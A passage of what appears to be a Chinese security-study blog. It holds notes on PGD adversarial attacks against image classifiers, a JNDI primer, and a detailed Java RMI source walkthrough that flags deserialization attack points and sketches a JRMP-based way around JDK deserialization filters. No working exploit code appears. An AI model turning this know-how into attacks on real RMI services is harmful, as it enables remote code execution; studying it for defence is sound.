PGD攻击效果\n\n自变量：\n\n```\neps：epsilon，对抗攻击的幅度，即每次攻击时允许的最大扰动量。\nnum_iter:轮数，对抗攻击迭代的次数，即进行对抗攻击的循环次数。\nalpha：单步攻击步长，每次对原始样本进行梯度上升的步长大小\n```\n\n对抗效果是最差的，eps从0.1开始，其准确率就下降到了10%以下\n\n<img src=\"FGSM.assets/ResNet18_0.05_accuracies.jpg\" alt=\"ResNet18_0.05_accuracies\" style=\"zoom:10%;\" /><img src=\"FGSM.assets/ResNet18_0.1_accuracies.jpg\" alt=\"ResNet18_0.1_accuracies\" style=\"zoom:10%;\" /><img src=\"FGSM.assets/ResNet18_0.15_accuracies.jpg\" alt=\"ResNet18_0.15_accuracies\" style=\"zoom:10%;\" />\n\n<img src=\"FGSM.assets/ResNet18_0.2_accuracies.jpg\" alt=\"ResNet18_0.2_accuracies\" style=\"zoom:10%;\" /><img src=\"FGSM.assets/ResNet18_0.25_accuracies.jpg\" alt=\"ResNet18_0.25_accuracies\" style=\"zoom:10%;\" /><img src=\"FGSM.assets/ResNet18_0.3_accuracies.jpg\" alt=\"ResNet18_0.3_accuracies\" style=\"zoom:10%;\" />\n\n\n\n#### 分析总结\n\n###### 某些情况中，当alpha和num_iter增大时，攻击效果反而变差\n\n**过度迭代导致过拟合对抗方向**：\n\n- 如果步长和迭代次数太大，扰动可能会变得过于复杂（特别eps较小时），远离了使得模型误分类的有效方向，从而导致对抗样本变得无效。\n- 过度迭代可能会导致对抗样本变得更加离散，不再沿着最有效的攻击方向。\n\n**数值稳定性问题**：\n\n- 过大的步长和迭代次数可能会导致数值不稳定性，扰动值可能超出有效范围，无法正确引导模型误分类。\n\n###### ResNet在非对抗情况下表现最好，但在对抗攻击下表现最差\n\n**模型复杂性和过拟合**：\n\n- ResNet由于其复杂性和深度，在训练时可能会过度拟合训练数据，导致在对抗攻击时，模型更容易受到影响。\n- 复杂的模型可能捕捉到数据中的细微特征，导致对抗样本能更容易地找到这些特征的脆弱点。\n\n###### epsilon（ε）\n\n在PGD攻击中，epsilon（ε）代表了对抗扰动的最大幅度，alpha（α）是每一步的步长，而num_iter是总的迭代次数。固定epsilon之后，alpha和num_iter的作用相对较小：\n\n**epsilon定义了扰动的上限**：\n\n- epsilon（ε）直接控制了扰动的最大幅度。因此，无论alpha和num_iter如何调整，扰动的总幅度不能超过epsilon定义的范围。这意味着epsilon是决定攻击强度的主要因素。\n\n**alpha和num_iter影响攻击的细节**：\n\n- alpha和num_iter更多地影响了生成对抗样本的路径和细节。当epsilon固定时，增加alpha和num_iter可以帮助更细致地探索对抗方向，但最终的扰动幅度还是受到epsilon的限制。\n- 增大num_iter会使攻击更加逼近epsilon所能达到的极限，而增大alpha则可能会让每一步的扰动更大，但由于最终扰动不能超过epsilon，过大的alpha可能导致不稳定的扰动，反而不利于有效攻击。\n\n**步长和迭代次数的权衡**：\n\n- 较大的alpha可能在每一步产生过大的扰动，导致无法有效逼近最优对抗方向。而较小的alpha配合更多的迭代次数可以在epsilon范围内更细致地调整扰动，使得攻击效果更佳。\n- num_iter的增加可以让扰动更充分地逼近epsilon的边界，但如果alpha过大，num_iter的增加作用会减弱，因为每一步的扰动已经很接近epsilon。\n\n###### 对抗训练有效提升模型对抗样本的鲁棒性\n\n通过对抗训练，模型（特别是ResNet）的准确率在对抗样本上有显著提升。这表明对抗训练有效增强了模型对对抗扰动的抵抗能力。对抗训练通过在训练过程中引入对抗样本，使模型学会如何处理和抵御这些样本，从而在测试时能够更好地应对对抗攻击。\n\n##### 总结\n\n1. **epsilon是决定攻击强度的主要因素**：\n   - 它定义了对抗扰动的最大范围，因此是决定攻击效果的主要因素。\n2. **alpha和num_iter的选择需要平衡**：\n   - 适中的alpha和num_iter组合能够在epsilon范围内生成有效的对抗扰动。过大的alpha和num_iter可能导致扰动过度复杂化，扰动效果反而下降。\n3. **复杂模型对抗效果的特殊性**：\n   - 复杂模型（如ResNet）在高维特征空间中的扰动路径更容易不稳定，因此需要特别注意alpha和num_iter的选择。\n4. **对抗训练的重要性**\n   - 对抗训练增强了模型的泛化能力，使其在面对未见过的对抗样本时也能表现出色\n","tags":["Python"],"categories":["安全"]},{"title":"JNDI学习","url":"/post/eb02829d.html","content":"\n### What is JNDI\n\nJNDI（Java Naming and Directory Interface）是一个API，它允许Java应用程序发现和查找基于名称的资源。JNDI的设计目的是提供一种通用的方式来访问各种命名和目录服务。\n\n主要功能：\n\n- **命名Naming**：通过名称来查找和绑定Java对象。命名服务的典型用途包括查找数据库连接、Java RMI对象、EJB（Enterprise JavaBeans）等。\n\n- **目录Directory**：除了命名功能，JNDI还支持访问目录服务，允许在对象中存储和检索属性。目录服务使得可以对命名对象进行更复杂的查询和操作。目录服务 = 命名服务 +  包含属性的对象\n\n### EXAMPLE(RMI + JNDI)\n\nstep 1: 创建InitialContext()初始化上下文\n\nstep 2: 将远程服务对象绑定到指定url \n\n","tags":["java"],"categories":["JNDI"]},{"title":"rmi_1","url":"/post/a787da62.html","content":"\n### 初识RMI\n\n- 概念：Java RMI (Remote Method Invocation) 是一种用于构建分布式应用程序的机制，允许Java对象调用远程服务器上的方法。\n\n<!--more-->\n\n- demo\n\n  RMIClient:\n\n  ```java\n  //  客户端通过LocateRegistry.getRegistry方法获取Registry对象\n  Registry registry = LocateRegistry.getRegistry(\"localhost\", 1099);\n  //  客户端通过lookup方法获取远程对象\n  IRemoteObj remoteObj = (IRemoteObj) registry.lookup(\"remoteObj\");\n  //  客户端调用远程对象的方法\n  System.out.println(remoteObj.sayHello(\"Hello, World!\"));\n  ```\n\n  RMIServer:\n\n  ```java\n  // 服务端创建远程对象\n  IRemoteObj remoteObj = new RemoteObjImpl();\n  // 服务端创建Registry对象\n  Registry registry = LocateRegistry.createRegistry(1099);\n  // 服务端将远程对象绑定到Registry对象\n  registry.bind(\"remoteObj\", remoteObj);\n  ```\n\n- 安全问题\n  1. RMI允许动态加载类，这可能被滥用进行代码注入攻击。恶意服务器可以发送恶意的类文件，导致客户端执行任意代码。\n  2. RMI依赖Java的序列化机制，将对象序列化为字节流进行传输。反序列化过程中如果处理不当，可能导致反序列化漏洞，使攻击者可以发送恶意数据，从而在目标系统上执行任意代码。\n- 组成\n  - 注册中心：哈希表，Naming->远程对象\n  - 服务端：用代理Skeleton(进行网络请求)\n  - 客户端：连接注册中心，用代理Stub(进行网络请求)\n- 通信\n  - 服务端->注册中心：绑定、重绑定\n  - 注册中心->服务端：RMI注册服务反向生成\n  - 客户端->注册中心：Naming\n  - 注册中心->客户端：获取Stub\n  - 服务端<->客户端：JRMP通信\n\n### 服务端\n\n#### 服务端创建远程服务\n\n>  服务端攻击注册中心：一句话逻辑解释：服务端调用bind(name,obj)注册远程对象，其中name，obj会以序列化方式发送给registry，registry反序列化它们，触发boom💣。\n\n创建代码为 `IRemoteObj remoteObj = new RemoteObjImpl();` ，实现类继承了`UnicastRemoteObject`类，如果服务端要将对象发布，也就是导出到注册端上去给客户端使用的话，那么该导出对象就需要继承`UnicastRemoteObject`，此时的端口设置为0\n\n> `UnicastRemoteObject` 是 Java RMI（Remote Method Invocation）中用于创建单播远程对象的一个类。单播远程对象是指在某一时刻只能由一个客户端调用的远程对象。这个类提供了基本的功能来导出远程对象，使其可以被远程访问。\n\n```java\nprotected UnicastRemoteObject(int port) throws RemoteException\n{\n    this.port = port;\n    exportObject((Remote) this, port);\n}\n```\n\n此处的`exportobject`在指定端口上导出一个远程对象\n\n```java\npublic static Remote exportObject(Remote obj, int port)\n    throws RemoteException\n{\n    return exportObject(obj, new UnicastServerRef(port));\n}\n```\n\n此处的`UnicastServerRef`是服务端对于网络请求的封装对象，实际上服务端发起的请求先是通过`UnicastServerRef`操作，而`UnicastServerRef`中操作是通过`StreamRemoteCall`来进行请求，继承的是LiveRef类的方法\n\n```java\npublic UnicastServerRef(int port) {\n    super(new LiveRef(port));\n}\n```\n\n`LiveRef`类中新建了对象`ID`，并传入端口号\n\n```java\npublic LiveRef(int port) {\n    this((new ObjID()), port);\n}\n```\n\n这里`port`传入了`TCPEndpoint`类的`getLocalEndpoint`方法，猜测这里是建立连接\n\n```java\npublic LiveRef(ObjID objID, int port) {\n    this(objID, TCPEndpoint.getLocalEndpoint(port), true);\n}\n```\n\n`getLocalEndpoint`方法中增加了两个参数调用了同名方法，调用的`getLocalEndpoint`是获取本地`IP`值和传入的端口号，此时端口号还是0\n\n```java\npublic static TCPEndpoint getLocalEndpoint(int port) {\n    return getLocalEndpoint(port, null, null);\n}\n```\n\n返回到上面`LiveRef`的`this`方法中，此时`LiveRef`对象中的参数如下\n\n<img src=\"rmi-1/image-20240614141242918.png\" alt=\"image-20240614141242918\" style=\"zoom:50%;\" />\n\n返回到上面的`UnicastServerRef`的`super`方法中，此处`UnicastServerRef`对象的参数如下\n\n<img src=\"rmi-1/image-20240614141424469.png\" alt=\"image-20240614141424469\" style=\"zoom:33%;\" />\n\n返回到`UnicastRemoteObject`的`exportObject`方法中，这里会调用传入的`UnicastServerRef`对象的`exportObject`方法\n\n```java\nprivate static Remote exportObject(Remote obj, UnicastServerRef sref)\n    throws RemoteException\n{\n    // if obj extends UnicastRemoteObject, set its ref.\n    if (obj instanceof UnicastRemoteObject) {\n        ((UnicastRemoteObject) obj).ref = sref;\n    }\n    return sref.exportObject(obj, null, false);\n}\n```\n\n`UnicastServerRef`对象的`exportObject`方法中实现了创建`RemoteObjImpl`对象的动态代理`stub`\n\n```java\nstub = Util.createProxy(implClass, getClientRef(), forceStubUse);\n```\n\n这里的`getClientRef()`会新建一个`UnicastRef`对象，而这里的`ref`就是创建的`LiveRef`对象，`UnicastRef`是客户端对于网络请求的封装对象，实际上客户端发起的请求先是通过`UnicastRef`操作，而`UnicastRef`中操作是通过`StreamRemoteCall`来进行请求\n\n```java\nprotected RemoteRef getClientRef() {\n    return new UnicastRef(ref);\n}\n// ------------------------------------\npublic UnicastRef(LiveRef liveRef) {\n    ref = liveRef;\n}\n```\n\n上面的`stub`就是为`getClientRef()`的返回创建一个代理对象，`stub`的数据如下\n\n<img src=\"rmi-1/image-20240614142318346.png\" alt=\"image-20240614142318346\" style=\"zoom:50%;\" />\n\n然后新建`target`对象，传入参数分别为`RemoteObjImpl`实现类（包含p~ort和`UnicastServerRef`对象），`UnicastServerRef`对象本身，`UnicastRef`代理对象，`LiveRef`的`objID`，`permanent`为`false`，代表非永久\n\n```java\nTarget target =\n    new Target(impl, this, stub, ref.getObjID(), permanent);\n```\n\n然后调用`LiveRef`对象的`exportObject`方法\n\n```java\nref.exportObject(target);\n```\n\n然后调用`ep`(`TCPEndpoint`对象)的`exportObject`方法\n\n```java\npublic void exportObject(Target target) throws RemoteException {\n    ep.exportObject(target);\n}\n```\n\n然后调用`TCPTransport`的方法，`TCPTransport`是在上面`TCPEndpoint`的`getLocalEndpoint`定义的，定义的参数包括`ip`和端口号，应该是用于建立连接的\n\n```java\npublic void exportObject(Target target) throws RemoteException {\n    transport.exportObject(target);\n}\n```\n\n这是`TCPTransport`对象的参数信息\n\n<img src=\"rmi-1/image-20240614143127357.png\" alt=\"image-20240614143127357\" style=\"zoom:50%;\" />\n\n在`TCPTransport`的`exportObject`方法中实现了`listen`进行端口监听\n\n<img src=\"rmi-1/image-20240614143326427.png\" alt=\"image-20240614143326427\" style=\"zoom:33%;\" />\n\n在`listen`函数中实现了创建服务端`socket`，创建新进程\n\n<img src=\"rmi-1/image-20240614143425352.png\" alt=\"image-20240614143425352\" style=\"zoom: 33%;\" />\n\n`TCPTransport`对象的变量更新如下\n\n<img src=\"rmi-1/image-20240614143618651.png\" alt=\"image-20240614143618651\" style=\"zoom:50%;\" />\n\n至此，服务端远程服务创建完成，总的来说先确定`IP`，然后逐步创建客户端代理`Stub`(为了客户端能通过该代理和服务端通信)，然后创建连接`socket`\n\n#### 创建注册中心+绑定\n\n服务端创建注册中心和创建远程访问的流程类似，都是在某端口开启网络通信服务，个别参数有一定区别，创建注册中心指定端口号为1099（默认）\n\n```java\n// 服务端创建Registry对象\nRegistry registry = LocateRegistry.createRegistry(1099);\n```\n\n`LocateRegistry`对象的`createRegistry`会创建`RegistryImpl`接口对象，并传入端口号1099\n\n```java\npublic static Registry createRegistry(int port) throws RemoteException {\n    return new RegistryImpl(port);\n}\n```\n\n在`RegistryImpl`类的创建方法中，会创建`LiveRef`对象，该对象的创建中会通过`getLocalEndpoint`方法确定`IP`和端口号，以及初始化后面会使用的`TCPTransport`对象（无`socket`）\n\n<img src=\"rmi-1/image-20240614151130924.png\" alt=\"image-20240614151130924\" style=\"zoom:50%;\" />\n\n返回的`lref`的返回如下\n\n<img src=\"rmi-1/image-20240614151343681.png\" alt=\"image-20240614151343681\" style=\"zoom: 33%;\" />\n\n接着将`lref`作为参数传递到`UnicastServerRef`的新建方法中，和服务端创建远程服务类似，主要看此处的`setup`方法，在该方法中调用了`UnicastServerRef`对象的`exportObject`函数，此处的`permanent`参数传递为`true`代表永久\n\n```java\nprivate void setup(UnicastServerRef uref)\n    throws RemoteException\n{\n    /* Server ref must be created and assigned before remote\n     * object 'this' can be exported.\n     */\n    ref = uref;\n    uref.exportObject(this, null, true);\n}\n```\n\n`UnicastServerRef`对象的`exportObject`函数中创建代理，`getClientRef()`返回的是`UnicastRef`对象（包含创建的`LiveRef`对象）\n\n<img src=\"rmi-1/image-20240614151900691.png\" alt=\"image-20240614151900691\" style=\"zoom:50%;\" />\n\n但是和创建远程服务不同，此处的`stub`返回的并不是一个代理，在`createProxy`方法中有一个`if`语句\n\n```java\nif (forceStubUse ||\n    !(ignoreStubClasses || !stubClassExists(remoteClass)))\n{\n    return createStub(remoteClass, clientRef);\n}\n```\n\n如果`remoteClass`类作为参数传递的`stubClassExists`中判断`remoteClass_stub`类存在，就不通过代理创建方式创建`stub`，但是注册接口类`RegistryImpl_stub`是存在的，因此就会进入此处的`if`循环，进入此处的`createStub`方法，然后就会获取`RegistryImpl_stub`类的实例对象，而非代理对象，并以创建的`UnicastRef`对象作为实例创建参数\n\n最后`stub`返回的是`RegistryImpl_stub`实例对象，接着又会进入此处`if`函数，执行`setSkeleton`函数，以`RegistryImpl`对象作为参数传递\n\n```java\nif (stub instanceof RemoteStub) {\n    setSkeleton(impl);\n}\n```\n\n接着又调用`Util`的`createSkeleton`方法\n\n<img src=\"rmi-1/image-20240614152708191.png\" alt=\"image-20240614152708191\" style=\"zoom:50%;\" />\n\n相当于就是创建`RegistryImpl_Skel`的实例对象\n\n<img src=\"rmi-1/image-20240614152808214.png\" alt=\"image-20240614152808214\" style=\"zoom:50%;\" />\n\n然后将设置好的\n\n- `impl`(`RegistryImpl`类，包含`Hashtable`类的`bindings`参数和`UnicastServerRef`类的`ref`参数，其中`ref`包含创建好的`skel`(`RegistryImpl_Skel`对象)，`ref`(`LiveRef`对象))，\n\n- `this`(`UnicastServerRef`类，包含创建好的`skel`(`RegistryImpl_Skel`对象)，`ref`(`LiveRef`对象))，\n\n- `stub`(`ResitryImpl_Stub`类，包含`UnicastRef`类的`ref`参数，`ref`包含创建的`LiveRef`对象)，\n\n作为参数新建`Target`变量，然后通过`LiveRef`类的`exportObject`方法建立`socket`\n\n```java\nTarget target =\n    new Target(impl, this, stub, ref.getObjID(), permanent);\nref.exportObject(target);\n```\n\n然后就是绑定方法`bind`的使用，这里的`registry`就是创建的`RegistryImpl_Stub`类的实例对象\n\n```java\n// 服务端将远程对象绑定到Registry对象\nregistry.bind(\"remoteObj\", remoteObj);\n```\n\n此处的`binding`初始化为空，因此会将传入的对象和`name`加入到`binding`列表中\n\n```java\npublic void bind(String name, Remote obj)\n    throws RemoteException, AlreadyBoundException, AccessException\n{\n    checkAccess(\"Registry.bind\");\n    synchronized (bindings) {\n        Remote curr = bindings.get(name);\n        if (curr != null)\n            throw new AlreadyBoundException(name);\n        bindings.put(name, obj);\n    }\n}\n```\n\n至此，服务端代码介绍完毕\n\n### 客户端\n\n#### 客户端请求注册中心\n\n首先指定`host`和`port`获取`Registry`对象\n\n```java\n//  客户端通过LocateRegistry.getRegistry方法获取Registry对象\nRegistry registry = LocateRegistry.getRegistry(\"localhost\", 1099);\n```\n\n再次调用同名函数`getRegistry`\n\n```java\npublic static Registry getRegistry(String host, int port)\n    throws RemoteException\n{\n    return getRegistry(host, port, null);\n}\n```\n\n然后新建`LiveRef`对象，传入`IP`和`port`，再以创建的`LiveRef`作为参数创建`UnicastRef`对象，然后创建代理对象，相当于这里的获取实际上并不是获取，而是通过传入的参数在本地创建好`RegistryImpl_Stub`类的实例对象\n\n```java\nLiveRef liveRef =\n    new LiveRef(new ObjID(ObjID.REGISTRY_ID),\n                new TCPEndpoint(host, port, csf, null),\n                false);\nRemoteRef ref =\n    (csf == null) ? new UnicastRef(liveRef) : new UnicastRef2(liveRef);\n\nreturn (Registry) Util.createProxy(RegistryImpl.class, ref, false);\n```\n\n接着通过`lookup`寻找远程对象\n\n```java\n//  客户端通过lookup方法获取远程对象\nIRemoteObj remoteObj = (IRemoteObj) registry.lookup(\"remoteObj\");\n```\n\n在`lookup`中会调用`UnicastRef`的`newCall`，在`newCall`方法中会根据传入的参数创立连接，同时在`lookup`中将传入的远程对象名字作为参数传递到建立的连接对象的序列化的函数中，意味着是将该参数进行序列化传递给注册中心，注册中心会负责进行反序列化\n\n<img src=\"rmi-1/image-20240614163338442.png\" alt=\"image-20240614163338442\" style=\"zoom: 33%;\" />\n\n返回的参数`var2`如下\n\n<img src=\"rmi-1/image-20240614163025294.png\" alt=\"image-20240614163025294\" style=\"zoom:50%;\" />\n\n然后会调用`invoke`方法，`invoke`方法中会调用 `call.executeCall();` ，该方法就是处理客户端网络请求的方法\n\n接着客户端会接受注册中心的返回结果，同样，要进行反序列化才能获取\n\n<img src=\"rmi-1/image-20240614163547092.png\" alt=\"image-20240614163547092\" style=\"zoom:33%;\" />\n\n**因此攻击手段可以考虑，模拟注册中心，向客户端发送有危害的序列化代码，客户端在进行反序列化时则会产生漏洞**\n\n**另外在`invoke`方法中，当产生异常`TransportConstants.ExceptionalReturn`时也会调用`readObject`方法**\n\n```java\ncase TransportConstants.ExceptionalReturn:\n    Object ex;\n    try {\n        ex = in.readObject();\n```\n\n因此只要有`invoke`方法或者`readObject`方法都有可能产生威胁\n\n#### 客户端请求服务端\n\n此处客户端通过`lookup`方法获取远程对象`remoteObj`是一个动态代理对象，因此会执行`UnicastRef`的`invoke`方法\n\n```java\n//  客户端调用远程对象的方法\nSystem.out.println(remoteObj.sayHello(\"Hello, World!\"));\n```\n\n在`invoke`方法中，首先创建连接\n\n<img src=\"rmi-1/image-20240614164948844.png\" alt=\"image-20240614164948844\" style=\"zoom:50%;\" />\n\n然后创建远程调用方法对象，然后将要传递的变量通过`marshaValue`进行序列化\n\n<img src=\"rmi-1/image-20240614165259985.png\" alt=\"image-20240614165259985\" style=\"zoom:33%;\" />\n\n`marshaValue`中就是对参数进行序列化\n\n<img src=\"rmi-1/image-20240614165327093.png\" alt=\"image-20240614165327093\" style=\"zoom:50%;\" />\n\n然后又执行网络请求（这里主要是处理客户端和服务端通信的`JRMP`协议，当出现指定异常时可利用）\n\n接着获取返回值然后通过`unmarshalValue`进行反序列化\n\n<img src=\"rmi-1/image-20240614165519789.png\" alt=\"image-20240614165519789\" style=\"zoom:50%;\" />\n\n### 客户端-服务端\n\n#### 客户端请求注册中心时的服务端\n\n服务端在创建注册中心时实际上会将创建的所有东西都放在target中，然后创建开启网络监听，创建新线程，会新建skel实例，因此该实例应是服务端用于接收客户端的请求的，当客户端通过lookup寻找远程服务时，服务端应收到请求并返回远程服务对象，因此，主要查看RegistryImpl_Skel类定义的函数，`dispatch` 函数的主要作用是接收并处理从客户端发送过来的请求。根据请求的内容，调用相应的方法来执行\n\n<img src=\"rmi-1/image-20240615143550267.png\" alt=\"image-20240615143550267\" style=\"zoom:50%;\" />\n\n现在查看服务端创建远程对象时socket创建新进程的流程，也就是TCPTransport的listen函数，在这里面会创建新进程，执行类为AcceptLoop\n\n<img src=\"rmi-1/image-20240616101922514.png\" alt=\"image-20240616101922514\" style=\"zoom:33%;\" />\n\n查看AcceptLoop的run方法\n\n<img src=\"rmi-1/image-20240616102003153.png\" alt=\"image-20240616102003153\" style=\"zoom:33%;\" />\n\n查看executeAcceptLoop方法，这里面又执行了ConnectionHandler类\n\n<img src=\"rmi-1/image-20240616102039718.png\" alt=\"image-20240616102039718\" style=\"zoom:33%;\" />\n\nConnectionHandler类的run方法执行了run0方法，run0方法中有一个读取input messages的函数handleMessages,这里面应该就是读取客户端信息的函数，咋子handleMessages函数中会根据传输的不同字段值调用不同函数，默认是serviceCall函数\n\n<img src=\"rmi-1/image-20240616102632213.png\" alt=\"image-20240616102632213\" style=\"zoom:33%;\" />\n\n在serviceCall函数中会获取创建过的target，此时的target\n\n<img src=\"rmi-1/image-20240616131547037.png\" alt=\"image-20240616131547037\" style=\"zoom: 33%;\" />\n\n在此处增加断点，并发起客户端请求，接着会获取target里面的分发器，这时候获取到的分发器就是有skel的UnicastServerRef类对象，应该是处理客户端请求\n\n<img src=\"rmi-1/image-20240616102946645.png\" alt=\"image-20240616102946645\" style=\"zoom:50%;\" />\n\n然后会调用disp(分发器)的dispatch方法\n\n<img src=\"rmi-1/image-20240616103126724.png\" alt=\"image-20240616103126724\" style=\"zoom:50%;\" />\n\n在dispatch中如果skel并不是null就会调用oldDispatch方法，oldDispatch方法中会调用skel的dispatch方法\n\n```java\nif (skel != null) {\n    oldDispatch(obj, call, num);\n    return;\n```\n\n在skel的dispatch方法中，执行语句如下，当var3为0，代表绑定命令，1代表list命令，2代表lookup(从注册中心寻找对应的远程对象)...传入lookup的参数var7是通过反序列化读出来的，该处有被攻击可能性，此处所有的case都有readObject方法，都有被攻击的可能性\n\n```java\nswitch (var3) {\n    case 0:\n\t\t//..\n        var6.bind(var7, var8);\n\t\t//...\n    case 1:\n        //...\n        String[] var97 = var6.list();\n\t\t//...\n    case 2:\n        try {\n            var10 = var2.getInputStream();\n            var7 = (String)var10.readObject();\n        } catch (IOException var89) {\n            throw new UnmarshalException(\"error unmarshalling arguments\", var89);\n        } catch (ClassNotFoundException var90) {\n            throw new UnmarshalException(\"error unmarshalling arguments\", var90);\n        } finally {\n            var2.releaseInputStream();\n        }\n\n        var8 = var6.lookup(var7);\n        //...\n    case 3:\n        //...\n        var6.rebind(var7, var8);\n\t\t//...\n    case 4:\n        //...\n        var6.unbind(var7);\n\t\t//...\n    default:\n        throw new UnmarshalException(\"invalid method number\");\n}\n```\n\n#### 客户端请求服务端时服务端\n\n还是一样的运行流程，不同的是此时获取的target是如下信息，其中的stub变成了动态代理，也就是服务端创建远程服务建立的动态代理，前面的target是服务器创建注册中心时创建的RegistryImpl_stub类的新实例\n\n<img src=\"rmi-1/image-20240616131710853.png\" alt=\"image-20240616131710853\" style=\"zoom: 33%;\" />\n\n此时的skel为null，此处不执行oldDispatch函数\n\n<img src=\"rmi-1/image-20240616132405085.png\" alt=\"image-20240616132405085\" style=\"zoom:33%;\" />\n\n然后获取method方法，并调用logCall记录\n\n<img src=\"rmi-1/image-20240616132501602.png\" alt=\"image-20240616132501602\" style=\"zoom:33%;\" />\n\n接着获取参数类型，并获取传递过来的参数，此处的unmarshalValue和上面分析的一样，是对参数进行反序列化（可利用）\n\n<img src=\"rmi-1/image-20240616132558249.png\" alt=\"image-20240616132558249\" style=\"zoom: 33%;\" />\n\n然后调用`invoke`函数执行方法`\n\n```java\ntry {\n    result = method.invoke(obj, params);\n} catch (InvocationTargetException e) {\n    throw e.getTargetException();\n}\n```\n\n最后把返回值序列化后传递回去\n\n```java\nObjectOutput out = call.getResultStream(true);\nClass<?> rtype = method.getReturnType();\nif (rtype != void.class) {\n    marshalValue(rtype, result, out);\n}\n```\n\n### DGC(客户端请求服务端)\n\n> 在前面的过程中建立了`DGCImpl` 类，这是 Java RMI 框架中的一个类，代表分布式垃圾回收 (Distributed Garbage Collection, DGC) 的实现。`dispatch` 函数在 `DGCImpl_Skel` 类中主要负责处理与分布式垃圾回收相关的远程方法调用。\n>\n> 分布式垃圾回收用于管理在分布式系统中引用对象的生命周期。为了实现这一点，`DGCImpl` 类通常提供的方法包括：\n>\n> 1. `dirty`：用于注册一个对象的引用。\n> 2. `clean`：用于注销一个对象的引用。\n\n特点：自动生成，只要创建了远程对象就一定会创建DGC\n\n创建完远程对象，会把所有的变量放在target中，然后放在一个静态表中\n\n```java\npublic void exportObject(Target target) throws RemoteException {\n    target.setExportedTransport(this);\n    ObjectTable.putTarget(target);\n}\n\nstatic void putTarget(Target target) throws ExportException {\n\t//...\n\tobjTable.put(oe, target);\n    implTable.put(weakImpl, target);\n    //...\n```\n\n但在put之前，objTable表中已经有了一个Target类，也有一个stub(DGCImpl_Stub)，说明在这之前已经创建了DGCImpl_Stub实例对象\n\n<img src=\"rmi-1/image-20240617211152942.png\" alt=\"image-20240617211152942\" style=\"zoom:33%;\" />\n\n回过头看DGCImpl_Stub实例对象的创建过程，事实上，在putTarget函数中就有该过程\n\n<img src=\"rmi-1/image-20240617211342125.png\" alt=\"image-20240617211342125\" style=\"zoom:50%;\" />\n\n这里的dgcLog是DGCImpl类的静态变量，当引用静态变量时，会执行静态代码块static{}里的内容，查看DGCImpl的static{}里的内容，也就是会执行此处的run函数\n\n<img src=\"rmi-1/image-20240617211647714.png\" alt=\"image-20240617211647714\" style=\"zoom:33%;\" />\n\n在run函数后面，会新建DGCImpl类对象，并新建LiveRef类对象，接着新建UnicastServerRef对象，并设置stub，设置skel，新建target，并通过put将target放入静态表中，这里创建的DGCImpl的功能和注册中心是一样的，也是有一个端口，建立的是实例对象而非动态代理对象，用于远程回收服务，调用时也是一样的，会调用其disp的dispatch方法\n\n```java\ndgc = new DGCImpl();\nObjID dgcID = new ObjID(ObjID.DGC_ID);\nLiveRef ref = new LiveRef(dgcID, 0);\nUnicastServerRef disp = new UnicastServerRef(ref);\nRemote stub =\n    Util.createProxy(DGCImpl.class,\n                     new UnicastRef(ref), true);\ndisp.setSkeleton(dgc);\n\nPermissions perms = new Permissions();\nperms.add(new SocketPermission(\"*\", \"accept,resolve\"));\nProtectionDomain[] pd = { new ProtectionDomain(null, perms) };\nAccessControlContext acceptAcc = new AccessControlContext(pd);\n\nTarget target = AccessController.doPrivileged(\n    new PrivilegedAction<Target>() {\n        public Target run() {\n            return new Target(dgc, disp, stub, dgcID, true);\n        }\n    }, acceptAcc);\n\nObjectTable.putTarget(target);\n```\n\n#### DGCImpl_stub(客户端)\n\ndirty函数中，调用了invoke(存在风险)\n\n<img src=\"rmi-1/image-20240617212457265.png\" alt=\"image-20240617212457265\" style=\"zoom:33%;\" />\n\n除此之外还有反序列化漏洞\n\n<img src=\"rmi-1/image-20240617212619027.png\" alt=\"image-20240617212619027\" style=\"zoom:33%;\" />\n\nclean函数中，也调用了invoke(存在风险)\n\n<img src=\"rmi-1/image-20240617212533978.png\" alt=\"image-20240617212533978\" style=\"zoom:33%;\" />\n\n#### DGCImpl_skel(服务端)\n\n同样存在漏洞\n\n<img src=\"rmi-1/image-20240617212724556.png\" alt=\"image-20240617212724556\" style=\"zoom: 25%;\" /><img src=\"rmi-1/image-20240617212745327.png\" alt=\"image-20240617212745327\" style=\"zoom:33%;\" />\n\n### JDK高版本绕过\n\n约束输入流类型，只有符合白名单的才允许被反序列化，在RegistryImpl类中定义了registryFilter方法\n\n<img src=\"rmi-1/image-20240617213238832.png\" alt=\"image-20240617213238832\" style=\"zoom:33%;\" />\n\n在DGC中也有了限制\n\n```java\nreturn (clazz == ObjID.class ||\n        clazz == UID.class ||\n        clazz == VMID.class ||\n        clazz == Lease.class)\n        ? ObjectInputFilter.Status.ALLOWED\n        : ObjectInputFilter.Status.REJECTED;\n```\n\n考虑利用此处的UnicastRef类，存在invoke，存在jrmp client反序列化攻击，所有rmi客户端\n\n<img src=\"rmi-1/image-20240617213734213.png\" alt=\"image-20240617213734213\" style=\"zoom:33%;\" />\n\n思考目标：在服务端开启客户端请求，导致服务端被攻击，也就是怎么在服务端调用UnicastRef类的invoke函数\n\n<img src=\"rmi-1/image-20240622154350020.png\" alt=\"image-20240622154350020\" style=\"zoom:33%;\" />\n\n调用invoke的对象大多是Registry_stub和DGCImpl_stub里，stub对象是在createPorxy函数中调用的，而前者的createproxy是在exportObject创建注册中心时创建的，后者在创建远程服务就已经创建了，在DGC的静态代码块和DGCClient类的EndPointEntry函数中都有调用\n\n<img src=\"rmi-1/image-20240617215553337.png\" alt=\"image-20240617215553337\" style=\"zoom: 33%;\" />\n\n我们要找到一个反序列化点，通过反序列化能够实现调用此处的函数创建DGCImpl_stub对象，并调用invoke方法\n\n1. 在服务端上创建DGCClient对象，创建dgc对象\n2. 让dgc对象在服务端上发起客户端请求，执行invoke函数\n\n#### 创建dgc对象\n\n首先找调用DGCClient类的EndPointEntry函数的位置，回溯到StreamRemoteCall的releaseInputStream方法,而这个函数是在skel里被调用，所以可利用，下图是releaseInputStream里调用的registerRefs方法，首先需要保证!incomingRefTable.isEmpty()结果为真，也就是incomingRefTable不为空\n\n<img src=\"rmi-1/image-20240622161211181.png\" alt=\"image-20240622161211181\" style=\"zoom:33%;\" />\n\nincomingRefTable是在saveRef中被赋值，saveRef在LiveRef的read中被调用，read方法被UnicastRef的readExternal方法调用，readExternal和readObject类似，在反序列化的时候会被调用，只要实现反序列化UnicastRef对象，就可以实现创建DGC对象，将序列化后的UnicastRef对象传递到RegistyImpl中，由于UnicastRef在白名单，因此可以被正常反序列化，最终实现DGC对象的创建\n\n#### 调用invoke\n\n在DGCClient中创建dgc对象之后，进入了新的线程函数RenewCleanThread\n\n<img src=\"rmi-1/image-20240622162542059.png\" alt=\"image-20240622162542059\" style=\"zoom:50%;\" 